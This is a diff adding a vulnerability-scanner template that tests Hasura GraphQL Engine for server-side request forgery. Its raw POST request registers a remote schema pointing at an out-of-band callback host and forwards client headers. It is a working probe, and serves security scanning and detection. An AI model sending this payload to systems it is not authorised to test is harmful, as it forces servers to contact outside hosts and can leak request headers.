@@ -1,0 +1,30 @@
+http:
+- matchers:
+  - status:
+    - 400
+    type: status
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
+  matchers-condition: and
+  raw:
+  - "POST /v1/query HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
+    Accept: */*\n\n{\n   \"type\":\"bulk\",\n   \"args\":[\n      {\n         \"type\"\
+    :\"add_remote_schema\",\n         \"args\":{\n            \"name\":\"test\",\n\
+    \            \"definition\":{\n               \"url\":\"https://{{interactsh-url}}\"\
+    ,\n               \"headers\":[\n               ],\n               \"timeout_seconds\"\
+    :60,\n               \"forward_client_headers\":true\n            }\n        \
+    \ }\n      }\n   ]\n}\n"
+id: hasura-graphql-ssrf
+info:
+  author: princechaddha
+  description: Hasura GraphQL Engine is vulnerable to SSRF( Server Side Request Forgery
+    )
+  metadata:
+    max-request: 1
+  name: Hasura GraphQL Engine - Server Side Request Forgery
+  reference:
+  - https://cxsecurity.com/issue/WLB-2021040115
+  severity: high
+  tags: hasura,ssrf,graphql
